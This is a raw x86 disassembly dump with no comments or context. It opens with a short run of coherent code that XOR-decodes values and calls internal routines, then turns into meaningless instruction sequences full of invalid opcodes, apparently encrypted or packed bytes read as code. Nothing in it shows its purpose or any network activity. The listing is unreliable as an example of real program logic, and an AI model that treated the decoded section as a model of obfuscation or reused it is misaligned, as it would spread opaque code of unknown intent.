  4081cb:	shl    DWORD PTR [edi-0x2d42f4e1],1
  4081d1:	cmp    BYTE PTR [edi+0x4458d5d],0x89
  4081d8:	inc    ebp
  4081d9:	loopne 0x4081ea
  4081db:	test   BYTE PTR [esp+edx*1+0x458d0000],cl
  4081e2:	call   0xd4860d37
  4081e7:	xor    eax,esi
  4081e9:	add    eax,edi
  4081eb:	push   eax
  4081ec:	mov    eax,DWORD PTR [ebp-0x1c]
  4081ef:	xor    eax,esi
  4081f1:	add    eax,edi
  4081f3:	push   eax
  4081f4:	push   DWORD PTR [ebp-0x8]
  4081f7:	lea    eax,[ebp-0x78]
  4081fa:	push   eax
  4081fb:	push   DWORD PTR [ebp-0xc]
  4081fe:	push   DWORD PTR [ebp-0x14]
  408201:	call   0x406508
  408206:	test   eax,eax
  408208:	je     0x408233
  40820e:	lea    eax,[ebp-0x78]
  408211:	push   eax
  408212:	mov    eax,DWORD PTR [ebp-0x14]
  408215:	xor    eax,esi
  408217:	add    eax,edi
  408219:	push   eax
  40821a:	mov    eax,DWORD PTR [ebp-0x10]
  40821d:	add    eax,0xee
  408222:	push   eax
  408223:	mov    eax,DWORD PTR [ebp-0x10]
  408226:	mov    eax,DWORD PTR [eax+0x198]
  40822c:	push   DWORD PTR [eax]
  40822e:	call   0x4120bb
  408233:	mov    ecx,DWORD PTR [ebp-0x1c]
  408236:	xor    ecx,esi
  408238:	mov    eax,0xffcd8d64
  40823d:	sub    eax,ecx
  40823f:	sub    eax,DWORD PTR [ebp-0x8]
  408242:	mov    ecx,DWORD PTR [ebp-0x30]
  408245:	add    ecx,eax
  408247:	mov    eax,DWORD PTR [ebp-0x8]
  40824a:	mov    DWORD PTR [eax+0x1],ecx
  40824d:	mov    al,BYTE PTR [ebp-0x1]
  408250:	mov    ecx,DWORD PTR [ebp-0x8]
  408253:	xor    al,0x47
  408255:	sub    al,0x37
  408257:	jmp    0x4085a4
  40825c:	ja     0x408201
  40825e:	mov    ecx,0x7175496f
  408263:	mov    ds:0xd6da6ce9,eax
  408268:	adc    esi,edx
  40826a:	xor    eax,0x70d2371c
  40826f:	jo     0x408291
  408271:	jge    0x4082e3
  408273:	jo     0x4082a2
  408275:	sbb    bh,BYTE PTR [ecx-0x7f35f739]
  40827b:	aad    0xd7
  40827d:	mov    dh,0xd4
  40827f:	jns    0x4082dc
  408281:	rcl    BYTE PTR [esi-0x7a],1
  408284:	jns    0x40828c
  408286:	jo     0x408297
  408288:	shl    BYTE PTR [edx-0x2e7374f6],cl
  40828e:	push   es
  40828f:	lock adc eax,0xaca83045
  408295:	in     al,dx
  408296:	out    0xdb,al
  408298:	inc    esp
  408299:	dec    edi
  40829a:	ficom  WORD PTR [ebp-0x2a76851f]
  4082a0:	addr16 call 0x55d92e0a
  4082a6:	icebp  
  4082a7:	es dec esi
  4082a9:	rcr    edi,cl
  4082ab:	aam    0x12
  4082ad:	pushf  
  4082ae:	out    0xe,al
  4082b0:	clc    
  4082b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4082b2:	lahf   
  4082b3:	sbb    bh,BYTE PTR [eax+0x18]
  4082b6:	xchg   esp,eax
  4082b7:	(bad)  
  4082b8:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  4082ba:	popf   
  4082bb:	mov    al,0x3f
  4082bd:	(bad)  
  4082be:	aas    
  4082bf:	lods   eax,DWORD PTR ds:[esi]
  4082c0:	ret    0x3487
  4082c3:	fimul  WORD PTR [edx-0x63]
  4082c6:	dec    eax
  4082c7:	xor    BYTE PTR [esi+0x2],0x8c
  4082cb:	iret   
  4082cc:	jmp    0x9fb04487
  4082d1:	shr    BYTE PTR [ecx-0x535f53ff],cl
  4082d7:	add    BYTE PTR [edi-0x2cccb2de],0x15
  4082de:	or     al,0x54
  4082e0:	out    dx,al
  4082e1:	hlt    
  4082e2:	push   ds
  4082e3:	xchg   al,cl
  4082e5:	add    DWORD PTR [ebp+0x54398a],edx
  4082eb:	jo     0x408278
  4082ed:	lahf   
  4082ee:	fld    st(0)
  4082f0:	mov    al,ds:0x725341fa
  4082f5:	xor    al,0xf1
  4082f7:	push   ebp
  4082f8:	adc    ebp,DWORD PTR [ebp-0x13431f26]
  4082fe:	mov    al,0x4f
  408300:	inc    eax
  408301:	popf   
  408302:	imul   edi,esi,0x74
  408305:	int3   
  408306:	aad    0x49
  408308:	inc    ecx
  408309:	fisttp QWORD PTR [esi-0x37]
  40830c:	dec    DWORD PTR [ebp+0x31]
  40830f:	sub    ebp,DWORD PTR ds:0x7f8ee701
  408315:	dec    edx
  408316:	jnp    0x40838a
  408318:	jno    0x408395
  40831a:	lahf   
  40831b:	test   BYTE PTR [esi-0x60],al
  40831e:	add    ecx,ebx
  408320:	fsubr  QWORD PTR [edi]
  408322:	addr16 pop edx
  408324:	aas    
  408325:	sti    
  408326:	jbe    0x408336
  408328:	int3   
  408329:	ret    
  40832a:	xor    bl,BYTE PTR [eax]
  40832c:	dec    ecx
  40832d:	ret    0xb872
  408330:	sbb    al,0x64
  408332:	cdq    
  408333:	sub    eax,0x5d473170
  408338:	mov    ds:0xe0b367d7,al
  40833d:	sar    DWORD PTR [edx+0x21498ff],0x38
  408344:	mov    al,0x52
  408346:	xchg   edx,eax
  408347:	sub    al,ah
  408349:	and    ah,0xa9
  40834c:	iret   
  40834d:	(bad)  
  40834e:	scas   eax,DWORD PTR es:[edi]
  40834f:	cmp    eax,ecx
  408351:	call   0x3031507e
  408356:	mov    WORD PTR [eax+0x5d],es
  408359:	mov    ecx,0xfcf4a36d
  40835e:	fistp  DWORD PTR [ebp-0x49848a55]
  408364:	dec    esp
  408365:	inc    edi
  408366:	cmp    DWORD PTR [ebx+0x16231bed],edi
  40836c:	pop    ecx
  40836d:	scas   eax,DWORD PTR es:[edi]
  40836e:	ficomp WORD PTR [ebp+0x68eb7ef0]
  408374:	cmp    al,0x9c
  408376:	mov    ebp,0x2c35ec3e
  40837b:	sbb    BYTE PTR [ecx+esi*8-0x1095718a],dl
  408382:	ja     0x40833a
  408384:	aas    
  408385:	cwde   
  408386:	mov    BYTE PTR cs:[edx],cl
  408389:	enter  0x5252,0x94
  40838d:	xchg   esp,eax
  40838e:	jmp    0x1ff:0x1eceb9fd
  408395:	cmp    ah,BYTE PTR [ecx]
  408397:	inc    ecx
  408398:	xchg   ebp,eax
  408399:	in     al,0x52
  40839b:	mov    bh,BYTE PTR ds:0x1947a6d0
  4083a1:	bound  ecx,QWORD PTR [ebp-0x4d]
  4083a4:	jb     0x408400
  4083a6:	xor    ebp,esp
  4083a8:	call   0x7f090bac
  4083ad:	add    BYTE PTR [eax],dl
  4083af:	cmc    
  4083b0:	mov    ch,bh
  4083b2:	in     eax,0xcd
  4083b4:	scas   al,BYTE PTR es:[edi]
  4083b5:	adc    DWORD PTR [edx+0xc],0x41
  4083b9:	cmp    DWORD PTR [ebx-0x35],ecx
  4083bc:	rcr    DWORD PTR [eax-0x6efd8461],cl
  4083c2:	inc    eax
  4083c3:	inc    esp
  4083c4:	xchg   DWORD PTR [ebx+0x56f72763],ebp
  4083ca:	stos   DWORD PTR es:[edi],eax
  4083cb:	push   cs
  4083cc:	push   ebp
  4083cd:	xor    DWORD PTR [eax+eiz*2],esi
  4083d0:	(bad)  
  4083d1:	retf   0xca31
  4083d4:	pushf  
  4083d5:	jnp    0x4083e3
  4083d7:	jp     0x40836b
  4083d9:	ficomp DWORD PTR [esi+0x69c68f7d]
  4083df:	sub    eax,0xeb5eea83
  4083e4:	pop    edx
  4083e5:	inc    ecx
  4083e6:	mov    ah,0x57
  4083e8:	jmp    0x40843e
  4083ea:	and    dl,ch
  4083ec:	cmp    BYTE PTR [ecx-0x23],cl
  4083ef:	idiv   DWORD PTR [edx]
  4083f1:	xchg   ebx,eax
  4083f2:	push   cs
  4083f3:	jb     0x408461
  4083f5:	inc    edx
  4083f6:	mov    ebx,0x90edb3b9
  4083fb:	mov    edx,0xd10c13c3
  408400:	ret    0x313c
  408403:	and    eax,eax
  408405:	or     al,0x38
  408407:	in     eax,dx
  408408:	ds xor cl,al
  40840b:	jns    0x408411
  40840d:	push   ss
  40840e:	push   edx
  40840f:	dec    ecx
  408410:	mov    al,0xa8
  408412:	out    0x59,eax
  408414:	pop    ds
  408415:	mov    dh,0xe2
  408417:	sbb    eax,0x95b2a22e
  40841c:	jne    0x40844a
  40841e:	or     eax,0x13b13184
  408423:	pop    ecx
  408424:	adc    eax,0xa8dae4
  408429:	pop    ebp
  40842a:	lahf   
  40842b:	retf   
  40842c:	or     eax,0xc3938747
  408431:	or     BYTE PTR [edx],dl
  408433:	adc    eax,0xc77a2b5a
  408438:	(bad)  
  408439:	das    
  40843a:	stos   DWORD PTR es:[edi],eax
  40843b:	addr16 pop eax
  40843d:	xor    eax,0xd2685c0c
  408442:	pop    es
  408443:	cli    
  408444:	jp     0x40841d
  408446:	adc    WORD PTR [esi-0x10],di
  40844a:	pop    ebp
  40844b:	cmc    
  40844c:	loopne 0x408410
  40844e:	ins    BYTE PTR es:[edi],dx
  40844f:	mov    WORD PTR [edx+0x1475222f],ds
  408455:	mov    ah,0xbe
  408457:	iret   
  408458:	mov    cl,0xec
  40845a:	cli    
  40845b:	fst    QWORD PTR [esi]
  40845d:	and    BYTE PTR ds:0x24e8550c,bl
  408463:	inc    DWORD PTR [ebx]
  408465:	stos   BYTE PTR es:[edi],al
  408466:	arpl   di,ax
  408468:	mov    ecx,0x28409f31
  40846d:	loope  0x408446
  40846f:	or     al,0x7d
  408471:	sbb    bh,BYTE PTR [ecx+eax*4]
  408474:	int    0x67
  408476:	push   edx
  408477:	retf   0x1fde
  40847a:	(bad)  
  40847b:	cmc    
  40847c:	push   edi
  40847d:	call   0x1caf:0x747a4620
  408484:	push   ds
  408485:	mov    DWORD PTR [eax],ecx
  408487:	stc    
  408488:	ins    DWORD PTR es:[edi],dx
  408489:	fsubrp st(4),st
  40848b:	out    0x3b,eax
  40848d:	cmp    DWORD PTR [edi+eiz*8],ebp
  408490:	pop    ecx
  408491:	out    0x8d,eax
  408493:	fnstsw WORD PTR ds:0xcc3312f5
  408499:	popf   
  40849a:	ss leave 
  40849c:	jl     0x40847d
  40849e:	xchg   edx,eax
  40849f:	push   edx
  4084a0:	cdq    
  4084a1:	mov    bl,0x98
  4084a3:	repz scas eax,DWORD PTR es:[di]
  4084a6:	cmp    dh,BYTE PTR ds:0xdb28dd70
  4084ac:	in     eax,dx
  4084ad:	sbb    al,0x88
  4084af:	and    BYTE PTR [ebx+0x6],al
  4084b2:	mov    DWORD PTR [ebx+0x5d],ecx
  4084b5:	adc    DWORD PTR [eax-0x7021ec66],edi
  4084bb:	fprem1 
  4084bd:	mov    eax,0xad946828
  4084c2:	shl    bh,1
  4084c4:	mov    BYTE PTR [ecx+0x47],al
  4084c7:	loopne 0x4084cc
  4084c9:	xchg   ecx,eax
  4084ca:	cmp    edi,0xfffffff9
  4084cd:	cmp    eax,0x42f37bf
  4084d2:	xchg   ebp,eax
  4084d3:	ins    DWORD PTR es:[edi],dx
  4084d4:	push   esi
  4084d5:	dec    eax
  4084d6:	mul    BYTE PTR [ebx+0x64]
  4084d9:	push   ecx
  4084da:	iret   
  4084db:	mov    DWORD PTR [eax],esp
  4084dd:	sub    edi,0xffffffee
  4084e0:	mov    bh,0xe6
  4084e2:	pop    ecx
  4084e3:	sbb    bl,BYTE PTR [ebx-0xc]
  4084e6:	sbb    ebp,DWORD PTR [ebp-0x7e7adc44]
  4084ec:	push   ecx
  4084ed:	ltr    WORD PTR [edi+0x63]
  4084f1:	test   DWORD PTR [eax+0x7c7bc74d],0x8c63b44d
  4084fb:	call   0x909be1fd
  408500:	dec    ecx
  408501:	inc    bx
  408503:	loopne 0x40855d
  408505:	aad    0x7
  408507:	inc    eax
  408508:	and    al,0x2
  40850a:	clc    
  40850b:	stc    
  40850c:	fdivr  st(1),st
  40850e:	cmp    ebp,DWORD PTR [ebp+0x27]
  408511:	xchg   BYTE PTR ss:[ecx-0x53],ch
  408515:	(bad)  
  408516:	ret    0x4070
  408519:	push   ebp
  40851a:	sar    DWORD PTR [ebp-0x31],1
  40851d:	add    DWORD PTR [edi+0x43d5ab54],0x3f
  408524:	mov    dh,0x66
  408526:	mov    esi,0x2ca63c22
  40852b:	ss sti 
  40852d:	mov    WORD PTR [edi],es
  40852f:	shl    DWORD PTR [edx],1
  408531:	push   ecx
  408532:	outs   dx,BYTE PTR ds:[esi]
  408533:	push   ds
  408534:	mov    ds:0x81147672,al
  408539:	add    bl,BYTE PTR [esi]
  40853b:	fsubr  QWORD PTR [eax]
  40853d:	in     eax,dx
  40853e:	xlat   BYTE PTR ds:[ebx]
  40853f:	loope  0x40855d
  408541:	cmp    ebx,DWORD PTR [esi-0x601be063]
  408547:	add    esp,ebx
  408549:	fs aam 0xf
  40854c:	ja     0x408534
  40854e:	push   eax
  40854f:	lock push esi
  408551:	and    al,BYTE PTR [ebp-0xe]
  408554:	push   cs
  408555:	out    0xa5,al
  408557:	mov    dl,0xa1
  408559:	mov    ds:0xeae176f1,al
  40855e:	repnz pop edx
  408560:	cdq    
  408561:	arpl   WORD PTR [edx+0x79fb7df2],bx
  408567:	sbb    bh,BYTE PTR [ebx]
  408569:	lahf   
  40856a:	arpl   WORD PTR [eax],bp
  40856c:	stc    
  40856d:	jae    0x40854d
  40856f:	jp     0x40850e
  408571:	(bad)  
  408572:	jmp    0x408511
  408574:	jle    0x408596
  408576:	jg     0x4085a8
  408578:	dec    ecx
  408579:	jnp    0x408519
  40857b:	and    ebx,DWORD PTR [edx]
  40857d:	jl     0x4085d0
  40857f:	push   es
  408580:	retf   0xfe83
  408583:	aaa    
  408584:	sbb    BYTE PTR [edi+0x2d],bh
  408587:	inc    ebx
  408588:	xor    al,0xaa
  40858a:	daa    
  40858b:	push   es
  40858c:	xchg   ecx,eax
  40858d:	and    eax,0x4a20cf5e
  408592:	push   es
  408593:	nop
  408594:	mov    eax,ds:0x3e0df177
  408599:	ja     0x4085e8
  40859b:	fisttp WORD PTR [ebx]
  40859d:	mov    esi,0xd39f0ffd
  4085a2:	push   esi
  4085a3:	xchg   DWORD PTR [eax+0x348e901],ecx
  4085a9:	add    BYTE PTR [eax],al
  4085ab:	inc    edi
  4085ac:	cli    
  4085ad:	fisttp DWORD PTR [edx+0x517569e1]
  4085b3:	jp     0x40858b
  4085b5:	xchg   ecx,eax
  4085b6:	mov    edx,0xeba3994c
  4085bb:	out    0xdf,eax
  4085bd:	jo     0x40862f
  4085bf:	and    BYTE PTR [ebp+0x70],bh
  4085c2:	jo     0x4085b3
  4085c4:	adc    edx,DWORD PTR [ecx+ebx*4]
  4085c7:	ds push es
  4085c9:	dec    esp
  4085ca:	fs cmc 
  4085cc:	ss in  eax,0xf8
  4085cf:	xchg   edi,eax
  4085d0:	cld    
  4085d1:	sbb    al,0xaa
  4085d3:	or     al,0xee
  4085d5:	js     0x408572
  4085d7:	push   ebp
  4085d8:	xchg   edi,eax
  4085d9:	fs jb  0x408656
  4085dc:	cmp    al,0xd7
  4085de:	sub    BYTE PTR [bx+si+0x3b36],ah
  4085e3:	cs cmc 
  4085e5:	addr16 jmp 0xa292:0x216d2bbd
  4085ed:	(bad)  
  4085ee:	or     ebx,DWORD PTR [ebp-0x5e1fde19]
  4085f4:	loop   0x408576
  4085f6:	fcomp  QWORD PTR [esi+0x21]
  4085f9:	xor    dl,BYTE PTR [esi]
  4085fb:	mov    ds,ecx
  4085fd:	test   DWORD PTR [ecx+0x69],edi
  408600:	test   BYTE PTR [ebx+0x18efa6bc],bl
  408606:	add    DWORD PTR [ebp-0x507726aa],0x458a3739
  408610:	std    
  408611:	and    eax,0xd4373348
  408616:	mov    al,ds:0x6438244e
  40861b:	and    dl,bl
  40861d:	fs es jo 0x40861e
  408621:	xor    eax,0xa7fe9398
  408626:	and    edx,DWORD PTR [ebx-0x1]
  408629:	add    ebx,edx
  40862b:	imul   eax,edi,0x61ee5dd2
  408631:	cmp    BYTE PTR [edi+0x31],0x17
  408635:	jmp    0x1727:0x7f78193d
  40863c:	ror    DWORD PTR [ebx+0x3c],1
  40863f:	dec    ebx
  408640:	add    DWORD PTR [edi-0x54],edi
  408643:	and    BYTE PTR [edx-0x34cc0120],cl
  408649:	mov    edx,0x291091bc
  40864e:	mov    ebx,0x7b02a2b8
  408653:	int3   
  408654:	dec    edi
  408655:	push   0xffffff9b
  408657:	loop   0x4086a9
  408659:	int3   
  40865a:	arpl   WORD PTR [eax+0xa],bp
  40865d:	xchg   esi,eax
  40865e:	xor    DWORD PTR [edx],esp
  408660:	xor    BYTE PTR [ebp-0xf],bl
  408663:	bound  edx,QWORD PTR [esi+0x22]
  408666:	icebp  
  408667:	and    al,0x73
  408669:	jg     0x408613
  40866b:	das    
  40866c:	sbb    eax,0x8a7b9527
  408671:	cmp    ah,dl
  408673:	push   cs
  408674:	sbb    edi,DWORD PTR [ecx+0x37]
  408677:	sub    DWORD PTR ds:0x76e9c3d6,eax
  40867d:	into   
  40867e:	mov    si,0x9ec1
  408682:	jp     0x408685
  408684:	pop    esp
  408685:	ins    DWORD PTR es:[edi],dx
  408686:	nop
  408687:	xchg   ebx,eax
  408688:	sub    BYTE PTR [ebx],dh
  40868a:	shl    DWORD PTR [esi],cl
  40868c:	mov    esi,0x5cbfdecf
  408691:	rcr    BYTE PTR [ebp+0x25],cl
  408694:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408695:	inc    eax
  408696:	scas   eax,DWORD PTR es:[edi]
  408697:	inc    ebp
  408698:	test   DWORD PTR [edx+edx*4-0x7f],0xf10c0a7e
  4086a0:	(bad)  
  4086a1:	add    BYTE PTR [edx+0x43dd934e],bh
  4086a7:	cmp    eax,0xb08baea4
  4086ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4086ad:	jns    0x408665
  4086af:	dec    esi
  4086b0:	jnp    0x40872b
  4086b2:	xchg   BYTE PTR [eax],bl
  4086b4:	push   ebx
  4086b5:	stc    
  4086b6:	loope  0x4086c2
  4086b8:	pop    ss
  4086b9:	sub    edx,ebx
  4086bb:	sti    
  4086bc:	and    DWORD PTR [edx],ebx
  4086be:	scas   eax,DWORD PTR es:[edi]
  4086bf:	inc    esi
  4086c0:	adc    BYTE PTR [edx-0x20542125],ah
  4086c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4086c7:	pop    ss
  4086c8:	pop    ds
  4086c9:	push   0xf057c11
  4086ce:	mov    dh,0xc1
  4086d0:	dec    esp
  4086d1:	mov    edi,0xe74c63e8
  4086d6:	in     al,0x51
  4086d8:	ins    BYTE PTR es:[edi],dx
  4086d9:	dec    esp
  4086da:	inc    edi
  4086db:	or     al,0x62
  4086dd:	int    0xcc
  4086df:	cs mov al,0x86
  4086e2:	xchg   edx,eax
  4086e3:	jne    0x408721
  4086e5:	in     al,0xbf
  4086e7:	xor    BYTE PTR [ebp+0x5634815f],al
  4086ed:	bnd jle 0x408720
  4086f0:	xchg   esi,eax
  4086f1:	add    dh,0x48
  4086f4:	arpl   dx,bp
  4086f6:	ret    
  4086f7:	dec    edi
  4086f8:	dec    ebx
  4086f9:	mov    ecx,0xce71e879
  4086fe:	mov    ah,0x1f
  408700:	mov    edx,0x138dac09
  408705:	dec    ecx
  408706:	push   es
  408707:	ss pop edx
  408709:	es sbb eax,0x5bd6902f
  40870f:	pop    esp
  408710:	(bad)  
  408711:	pop    edx
  408712:	popa   
  408713:	add    ebx,0xffffffa2
  408716:	test   DWORD PTR ds:0x10c271eb,0xf7571d7d
  408720:	addr16 xchg ebp,eax
  408722:	mov    ds:0xc7906df2,al
  408727:	retf   0x1a49
  40872a:	dec    eax
  40872b:	xchg   edx,eax
  40872c:	sbb    dl,BYTE PTR fs:[ebp-0x3e]
  408730:	ins    DWORD PTR es:[edi],dx
  408731:	jl     0x40872d
  408733:	inc    edx
  408734:	jmp    0x2e2c116e
  408739:	adc    al,0x40
  40873b:	popa   
  40873c:	out    dx,eax
  40873d:	xchg   edi,eax
  40873e:	xor    bl,bl
  408740:	jb     0x408708
  408742:	inc    eax
  408743:	js     0x4087a0
  408745:	cmovo  edi,DWORD PTR [ecx+ebp*2]
  408749:	inc    eax
  40874a:	repnz aas 
  40874c:	adc    edi,DWORD PTR [esi+0x490b98ef]
  408752:	add    eax,0x6d856b77
  408757:	add    al,0xd6
  408759:	popa   
  40875a:	sbb    eax,0x2cc2764d
  408760:	ror    BYTE PTR [ebp+0x14fd2871],cl
  408766:	xor    esi,DWORD PTR [ecx+ebx*1-0x3ebbed18]
  40876d:	jle    0x40870b
  40876f:	push   edx
  408770:	mov    bl,0x56
  408772:	jle    0x408703
  408774:	xor    eax,0x192c0c16
  408779:	pusha  
  40877a:	(bad)  
  40877c:	test   al,0x19
  40877e:	lods   al,BYTE PTR ds:[esi]
  40877f:	mov    ecx,0xec474e92
  408784:	adc    eax,0xcd22db46
  408789:	test   edi,ebx
  40878b:	in     eax,dx
  40878c:	(bad)  
  40878d:	fisubr WORD PTR [edi+0x46c1a751]
  408793:	xchg   edx,eax
  408794:	push   ss
  408795:	(bad)
  408798:	mov    edi,0xe6331910
  40879d:	lahf   
  40879e:	dec    ebp
  40879f:	inc    esp
  4087a0:	add    ecx,DWORD PTR [ebp-0x62]
  4087a3:	xchg   edx,eax
  4087a4:	sub    eax,0xaceb75d7
  4087a9:	sub    eax,0x556d732b
  4087ae:	int3   
  4087af:	push   cs
  4087b0:	pop    ds
  4087b1:	and    DWORD PTR [ebx+eax*2-0x14ad6141],esp
  4087b8:	pop    ebp
  4087b9:	dec    ebp
  4087ba:	pop    esp
  4087bb:	retf   0xc91e
  4087be:	mov    ah,0xf0
  4087c0:	xor    dl,BYTE PTR [ecx]
  4087c2:	sbb    ah,ah
  4087c4:	das    
  4087c5:	imul   esp,DWORD PTR [esi-0x6b],0xa04d9b90
  4087cc:	push   esi
  4087cd:	push   0xf89309bc
  4087d2:	shl    DWORD PTR [edx],cl
  4087d4:	aaa    
  4087d5:	xor    ah,dl
  4087d7:	jns    0x40876d
  4087d9:	sub    eax,0x22c5b19e
  4087de:	std    
  4087df:	stos   DWORD PTR es:[edi],eax
  4087e0:	rsm    
  4087e2:	sahf   
  4087e3:	data16 xor al,0x61
  4087e6:	and    cl,BYTE PTR [ecx-0x7e]
  4087e9:	mov    esp,0xd43eefdd
  4087ee:	pop    ebp
  4087ef:	inc    edx
  4087f0:	cmp    al,0xe5
  4087f2:	xor    al,0x79
  4087f4:	xor    DWORD PTR [ecx-0x37a6c8b0],ebp
  4087fa:	(bad)  
  4087fb:	cli    
  4087fc:	fisub  WORD PTR [eax]
  4087fe:	mov    bl,0x16
  408800:	cli    
  408801:	scas   eax,DWORD PTR es:[edi]
  408802:	lock loopne 0x4087a9
  408805:	sahf   
  408806:	add    DWORD PTR [edx],eax
  408808:	push   ecx
  408809:	push   ds
  40880a:	sbb    ah,BYTE PTR [ebx]
  40880c:	xchg   ch,bl
  40880e:	jmp    0x960b36d
  408813:	repnz add al,0x96
  408816:	mov    dl,0x3a
  408818:	push   esp
  408819:	cmp    ecx,esp
  40881b:	push   ds
  40881c:	sub    dl,ch
  40881e:	xchg   esi,eax
  40881f:	ja     0x408842
  408821:	leave  
  408822:	(bad)  
  408823:	xor    ah,al
  408825:	test   DWORD PTR [edx-0x22],ebp
  408828:	scas   al,BYTE PTR es:[edi]
  408829:	int3   
  40882a:	in     eax,0x15
  40882c:	pop    esp
  40882d:	push   0x4fd5262d
  408832:	test   al,0xf4
  408834:	(bad)  
  408835:	jbe    0x40885a
  408837:	fnsave [ebp+0x68043615]
  40883d:	sbb    eax,0x91968ce3
  408842:	enter  0x89eb,0xaf
  408846:	inc    ebp
  408847:	inc    ebx
  408848:	inc    esp
  408849:	call   0x85c1ae
  40884e:	out    0xbf,al
  408850:	pop    es
  408851:	cmp    BYTE PTR [ecx-0x533a107a],bl
  408857:	dec    edi
  408858:	mov    cl,0xbb
  40885a:	shl    DWORD PTR [ebx],1
  40885c:	sbb    eax,0x50b76f58
  408861:	xchg   ecx,eax
  408862:	rcr    DWORD PTR [edi],1
  408864:	and    DWORD PTR [eax+0xf],edi
  408867:	xchg   esi,eax
  408868:	sub    bl,BYTE PTR [esi]
  40886a:	pop    esp
  40886b:	xor    eax,0x43355995
  408870:	cdq    
  408871:	mov    bl,0xd9
  408873:	dec    esi
  408874:	addr16 dec esi
  408876:	mov    bh,BYTE PTR [ebp+0x287ca8b9]
  40887c:	mov    cl,0xe4
  40887e:	js     0x4088eb
  408880:	(bad)  
  408881:	jge    0x4088a4
  408883:	(bad)  
  408884:	dec    esi
  408885:	inc    ebp
  408886:	inc    ecx
  408887:	sbb    dh,BYTE PTR [ecx]
  408889:	icebp  
  40888a:	imul   esi,DWORD PTR [edi-0x29],0x38
  40888e:	xor    al,0x77
  408890:	nop
  408891:	push   cs
  408892:	dec    edi
  408893:	add    bl,0x5e
  408896:	std    
  408897:	inc    eax
  408898:	mov    WORD PTR [ebx],cs
  40889a:	xor    eax,0x144fe9fa
  40889f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4088a0:	mov    ah,BYTE PTR [esi-0x76]
  4088a3:	sbb    al,0x25
  4088a5:	arpl   WORD PTR cs:[esi-0x3d4ca2e1],di
  4088ac:	sbb    eax,0x823eb845
  4088b1:	mov    esp,DWORD PTR [edi]
  4088b3:	push   0x40
  4088b5:	xor    eax,0x8c62be9
  4088ba:	das    
  4088bb:	pusha  
  4088bc:	es cdq 
  4088be:	mov    bh,0x9e
  4088c0:	add    DWORD PTR [ecx],eax
  4088c2:	dec    eax
  4088c3:	sbb    esi,DWORD PTR [edi+0x6b]
  4088c6:	mov    ds:0x4025fc59,eax
  4088cb:	shl    DWORD PTR [ebx-0x78],cl
  4088ce:	pop    ecx
  4088cf:	pop    ecx
  4088d0:	xchg   dh,al
  4088d2:	inc    edx
  4088d3:	retf   0x1e74
  4088d6:	adc    eax,ecx
  4088d8:	pop    ebp
  4088d9:	inc    ebx
  4088da:	or     BYTE PTR [edx],ch
  4088dc:	rcr    BYTE PTR [eax],0x17
  4088df:	sbb    esi,DWORD PTR [eax-0x57740525]
  4088e5:	iret   
  4088e6:	outs   dx,BYTE PTR ds:[esi]
  4088e7:	or     ch,0xc7
  4088ea:	jae    0x40890d
  4088ec:	lods   eax,DWORD PTR ds:[esi]
  4088ed:	adc    eax,0x1ab48128
  4088f2:	(bad)  
  4088f3:	lea    eax,[ebp-0x8]
  4088f6:	inc    BYTE PTR [eax]
  4088f8:	inc    eax
  4088f9:	push   eax
  4088fa:	jmp    0x408c47
  4088ff:	mov    al,0x3c
  408901:	fwait
  408902:	xchg   ebx,eax
  408903:	fwait
  408904:	jae    0x40896e
  408906:	rol    DWORD PTR [ebp-0x7abca301],cl
  40890c:	or     al,0x44
  40890e:	icebp  
  40890f:	xchg   edi,eax
  408910:	fdiv   QWORD PTR [eax+0x70]
  408913:	and    BYTE PTR [ebp+0x70],bh
  408916:	jo     0x4088a9
  408918:	mov    WORD PTR ds:0x887f86f7,gs
  40891e:	mov    BYTE PTR [edx-0x4ac442da],cl
  408924:	push   eax
  408925:	aas    
  408926:	mov    cl,0x57
  408928:	ins    BYTE PTR es:[edi],dx
  408929:	int3   
  40892a:	mov    bh,0x5
  40892c:	cmc    
  40892d:	adc    eax,0xf25d2f73
  408932:	stos   DWORD PTR es:[edi],eax
  408933:	in     eax,0x76
  408935:	vpsubusw ymm6,ymm2,YMMWORD PTR [edx+esi*1]
  40893a:	sahf   
  40893b:	cmp    eax,0x84b3580e
  408940:	jp     0x40897b
  408942:	(bad)  
  408944:	mov    ds:0x61af9a27,eax
  408949:	and    eax,0xba87927d
  40894e:	mov    ch,BYTE PTR [esi-0x7e]
  408951:	or     DWORD PTR [esp+eax*2-0x54f4111],ebp
  408958:	dec    ebx
  408959:	sub    al,0x5b
  40895b:	xor    DWORD PTR [esi-0x42],edx
  40895e:	enter  0x76a5,0x32
  408962:	fnsave [edx-0x1]
  408965:	in     al,0xc3
  408967:	dec    ecx
  408968:	sub    al,BYTE PTR [ecx+0x9806736]
  40896e:	les    edx,FWORD PTR [eax-0x70cf38c]
  408974:	dec    eax
  408975:	add    al,0xa5
  408977:	cli    
  408978:	test   eax,0x8df4f86a
  40897d:	mov    al,ds:0x9c84e595
  408982:	ret    0x7867
  408985:	(bad)  
  408986:	jp     0x40891a
  408988:	call   0x7a42:0x43f275d2
  40898f:	es loop 0x40897c
  408992:	repnz sar esp,1
  408995:	xchg   esp,eax
  408996:	add    bh,BYTE PTR [edx]
  408998:	cdq    
  408999:	shl    BYTE PTR [edi+0x71880adb],0xf3
  4089a0:	mov    al,0xbe
  4089a2:	imul   esi,DWORD PTR [esi+0x2c545780],0x44
  4089a9:	ds pop edi
  4089ab:	xor    ch,BYTE PTR [ecx]
  4089ad:	xchg   BYTE PTR [ebx+edx*4],cl
  4089b0:	mov    cl,0x5c
  4089b2:	jmp    0x811d:0x56c1b1e4
  4089b9:	mov    ds:0x7618dc66,eax
  4089be:	inc    ecx
  4089bf:	lods   al,BYTE PTR ds:[esi]
  4089c0:	inc    ecx
  4089c1:	retf   
  4089c2:	mov    dl,bl
  4089c4:	xchg   DWORD PTR [esi-0x6bbf0a37],ebp
  4089ca:	fadd   DWORD PTR [ebx-0x64c1780e]
  4089d0:	ins    BYTE PTR es:[edi],dx
  4089d1:	xchg   esp,eax
  4089d2:	cwde   
  4089d3:	in     al,0x3c
  4089d5:	cmp    ch,BYTE PTR [ebx-0xc]
  4089d8:	scas   al,BYTE PTR es:[edi]
  4089d9:	fisub  DWORD PTR [edx+0x7353905c]
  4089df:	sbb    BYTE PTR [edx],bh
